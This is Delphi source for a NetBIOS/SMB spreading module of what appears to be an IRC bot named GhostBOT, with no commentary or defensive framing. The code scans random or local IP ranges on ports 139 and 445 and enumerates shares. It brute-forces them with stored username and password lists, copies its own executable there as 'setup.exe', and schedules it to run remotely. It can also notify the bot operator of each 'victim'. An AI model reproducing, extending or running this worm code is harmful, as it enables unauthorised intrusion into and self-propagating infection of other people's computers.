   UNIT uNetBIOS;

   INTERFACE

   USES
     Windows, ACLUtils, uUtils;

   {$I Settings.ini}

   PROCEDURE TNetBIOS;

   IMPLEMENTATION

   USES
     uBot;

   PROCEDURE TNetBIOS;
   VAR
     ClassA       : BYTE;
     ClassB       : BYTE;
     ClassC       : BYTE;
     ClassD       : BYTE;
     LANInfect    : BOOL;
     ISPInfect    : BOOL;
     szIPAddr     : STRING;
     szRemoteAddr : STRING;

   CONST
     NERR_SUCCESS             = 0;
     MAX_USERNAME             = 3;
     STYPE_PRINTQ             = 1;
     MAX_PASSWORD             = 101;

     {$I Resources\TNBLOGIN.INI}
     {$I Resources\TNBPASSWORD.INI}

     //----------------------------------------------------------------------------
     PROCEDURE GetISPIP;
     LABEL Abort;
     TYPE
       TAPInAddr = ARRAY [0..100] OF PInAddr;
       PAPInAddr =^TAPInAddr;
     VAR
       I          : Integer;
       WSAData    : TWSAData;
       HostEntPtr : PHostEnt;
       pptr       : PAPInAddr;
     BEGIN
       WSAStartUp($101,WSAData);
       TRY
         HostEntPtr:=GetHostByName(nil);
         IF HostEntPtr=NIL THEN GOTO Abort;
         pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
         I:=0;
         WHILE pptr^[I]<>NIL DO BEGIN
           IF(Pos('169',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
             ClassA:=Ord(pptr^[I]^.S_un_b.s_b1);
             ClassB:=Ord(pptr^[I]^.S_un_b.s_b2);
             ClassC:=Ord(pptr^[I]^.S_un_b.s_b3);
             ClassD:=Ord(pptr^[I]^.S_un_b.s_b4);
             GOTO Abort;
           END;
           Inc(I);
        END;
          Abort:
       EXCEPT
       END;
       WSACleanUp();
     END;

     //----------------------------------------------------------------------------
     PROCEDURE NetRemoteExecute(szLocation:STRING);
     TYPE
       PTIME_OF_DAY_INFO = ^TTIME_OF_DAY_INFO;
       TTIME_OF_DAY_INFO = RECORD
         tod_elapsedt    : DWORD;
         tod_msecs       : DWORD;
         tod_hours       : DWORD;
         tod_mins        : DWORD;
         tod_secs        : DWORD;
         tod_hunds       : DWORD;
         tod_timezone    : LongInt;
         tod_tinterval   : DWORD;
         tod_day         : DWORD;
         tod_month       : DWORD;
         tod_year        : DWORD;
         tod_weekday     : DWORD;
       END;
       AT_INFO           = RECORD
         JobTime         : DWORD;
         DaysOfMonth     : DWORD;
         DaysOfWeek      : UCHAR;
         Flags           : UCHAR;
         Command         : pWideChar;
       END;
      VAR
       JobID        : DWORD;
       dwRemoteTime : DWORD;
       dwReturn     : DWORD;
       NetAT        : AT_INFO;
       wcCmd        : PWideChar;
       wcServer     : PWideChar;
       lpNetTOD     : PTIME_OF_DAY_INFO;
     BEGIN
       GetMem(wcCmd,1024+1);
       GetMem(wcServer,256+1);
       lpNetTOD:=NIL;
       StringToWideChar(szRemoteAddr,wcServer,256);
       StringToWideChar(szLocation,wcCmd,1024);
       dwReturn:=lpNetRemoteTOD(pChar(szRemoteAddr),@lpNetTOD);
       IF dwReturn=NERR_Success THEN BEGIN
         //* add 2 minutes to current time
         dwRemoteTime:=(lpNetTOD.tod_hours*3600+lpNetTOD.tod_mins*60+lpNetTOD.tod_secs)*1000+lpNetTOD.tod_hunds*10;
         IF lpNetTOD.tod_timezone<>-1 THEN dwRemoteTime:=dwRemoteTime-lpNetTOD.tod_timezone*60000;
         dwRemoteTime:=dwRemoteTime+60000;                                           //* add two minutes to current remote time
         IF IsNTBasedOS THEN lpNetApiBufferFree(lpNetTOD);
         ZeroMemory(@NetAT,SizeOf(NetAT));
         NetAT.JobTime:=dwRemoteTime;
         NetAT.Command:=wcCmd;
         lpNetScheduleJobAdd(pChar(wcServer),@NetAT,JobID);
       END;
       FreeMem(wcCmd);
       FreeMem(wcServer);
     END;

     //----------------------------------------------------------------------------
     FUNCTION InfectSharedResource(szRemoteName:STRING) : BOOL;
     VAR
       MaxUserName : WORD;
       MaxPassword : WORD;
       I           : DWORD;
       dwRet       : DWORD;
       {$IFDEF Use_NetBIOS_Notifier}
       S           : STRING;
       {$ENDIF}
       szFullPath  : STRING;
       nK          : Integer;
       nL          : Integer;
       NetResource : TNetResource;
     BEGIN
       Result:=False;
       szRemoteName:=szRemoteAddr+'\'+szRemoteName;
       NetResource.dwType:=RESOURCETYPE_DISK;
       NetResource.lpLocalName:=NIL;
       NetResource.lpRemoteName:=pChar(szRemoteName);
       NetResource.lpProvider:=NIL;
       GetModuleFileName(GetModuleHandle(NIL),pChar(szFullPath),Length(szFullPath));
       IF IsNTBasedOS THEN BEGIN
         MaxUserName:=ItemsCountInEncodedString(TNBLOGIN);
         MaxPassword:=ItemsCountInEncodedString(TNBPASSWORD);
       END ELSE BEGIN
         MaxUserName:=1;
         MaxPassword:=1;
       END;
       FOR nK:=1 TO MaxUserName DO BEGIN
         FOR nL:=1 TO MaxPassword DO BEGIN
           dwRet:=WNetAddConnection2(NetResource,pChar(DecodeString(nL,TNBPASSWORD)),pChar(DecodeString(nK,TNBLOGIN)),0);
           IF dwRet=NO_ERROR THEN BEGIN
             FOR I:=1 TO 4 DO BEGIN
               IF DirectoryExists(NetResource.lpRemoteName+MainStr(185+I)) THEN BEGIN
                 IF CopyFile(pChar(ParamStr(0)),pChar(szRemoteName+MainStr(185+I)+MainStr(190)),False) THEN BEGIN //"setup.exe"
                   {$IFDEF Use_NetBIOS_Notifier}
                   S:='NetBIOS spreader found a victim: '+szRemoteName;
                   GhostBOT.PrivMsg(S,GhostBOT.BOTSock);
                   {$ENDIF}
                   IF IsNTBasedOS THEN NetRemoteExecute(szRemoteName+MainStr(185+I)+MainStr(190));  //"setup.exe"
                   Result:=True;
                 END;
               END;
             END;
             WNetCancelConnection(NetResource.lpRemoteName,True);
             Break;
           END;
         END;
       END;
     END;

     //----------------------------------------------------------------------------
     FUNCTION EnumShare : BOOL;
     TYPE
       Share_INFO_1   = RECORD
         shi1_netname : PWideChar;
         shi1_type    : DWORD;
         shi1_remark  : LPTSTR;
       END;
       LPShare_INFO_1 =^Share_INFO_1;
     VAR
       dwK            : DWORD;
       hResume        : DWORD;
       dwReturn       : DWORD;
       dwReadEntires  : DWORD;
       dwTotalEntires : DWORD;
       szShareName    : STRING;
       wcRemoteAddr   : pWideChar;
       lpShareInfo    : LPSHARE_INFO_1;
       lpCurrentInfo  : LPSHARE_INFO_1;
     BEGIN
       Result:=False;
       GetMem(wcRemoteAddr,MAX_PATH);
       StringToWideChar(szRemoteAddr,wcRemoteAddr,MAX_PATH);
       hResume:=0;
       REPEAT
         lpShareInfo:=NIL;
         IF IsNTBasedOS THEN dwReturn:=NT_NetShareEnum(wcRemoteAddr,1,lpShareInfo,8192,dwReadEntires,dwTotalEntires,hResume)
          ELSE dwReturn:=OLD_NetShareEnum(pChar(wcRemoteAddr),1,lpShareInfo,8192,dwReadEntires,dwTotalEntires);
         IF(dwReturn<>ERROR_MORE_DATA)AND(dwReturn<>ERROR_SUCCESS) THEN Break;
         lpCurrentInfo:=lpShareInfo;
         FOR dwK:=0 TO dwReadEntires-1 DO BEGIN
           szShareName:=lpCurrentInfo.shi1_netname;
           IF lpcurrentinfo.shi1_type<>STYPE_PRINTQ THEN Result:=InfectSharedResource(szShareName);
           Inc(lpCurrentInfo);
         END;
         IF IsNTBasedOS THEN lpNetAPIBufferFree(lpShareInfo);
       UNTIL dwReturn<>ERROR_MORE_DATA;
       FreeMem(wcRemoteAddr);
     END;

     //----------------------------------------------------------------------------
     PROCEDURE GetRandomIP;
     BEGIN
       ClassA:=Random(223)+1;
       ClassB:=Random(255)+1;
       ClassC:=Random(255)+1;
       ClassD:=Random(255)+1;
       IF ISPInfect THEN BEGIN
         GETISPIP;
         ClassC:=Random(255)+1;
         ClassD:=Random(255)+1;
       END;
       IF LANInfect THEN BEGIN
         ClassA:=192;
         ClassB:=169;
         ClassC:=Random(255)+1;
         ClassD:=Random(255)+1;
       END;
       IF ClassA=127 THEN Inc(ClassA);
       szIPAddr:=IntToStr(ClassA)+'.'+IntToStr(ClassB)+'.'+IntToStr(ClassC)+'.'+IntToStr(ClassD);
     END;

     //----------------------------------------------------------------------------
     PROCEDURE InfectNetBIOS;
     VAR
       Connected : BOOL;
       Sock      : TSocket;
     BEGIN
       szIPAddr:='';
       WHILE True DO BEGIN
         Connected:=False;
         WaitForInternet;
         GetRandomIP;
         Sock:=Create_Sock(szIPAddr,'139');
         IF Sock>0 THEN Connected:=True ELSE BEGIN
           Sock:=Create_Sock(szIPAddr,'445');
           IF Sock>0 THEN Connected:=True;
         END;
         IF Connected THEN BEGIN
           CloseSocket(Sock);
           szRemoteAddr:='\\'+szIPAddr;
           EnumShare;
         END;
         Sleep(512);
       END;
     END;

   BEGIN
     ISPInfect:=False;
     LANInfect:=False;
     IF WaitForSingleObject(CreateMutexA(NIL,False,pChar(MainStr(180))),0)<>Wait_TimeOut THEN LANInfect:=True;
     IF (LANInfect=False)AND(WaitForSingleObject(CreateMutexA(NIL,False,pChar(MainStr(181))),0)<>Wait_TimeOut) THEN ISPInfect:=True;
     InfectNetBios;
   END;

   END.
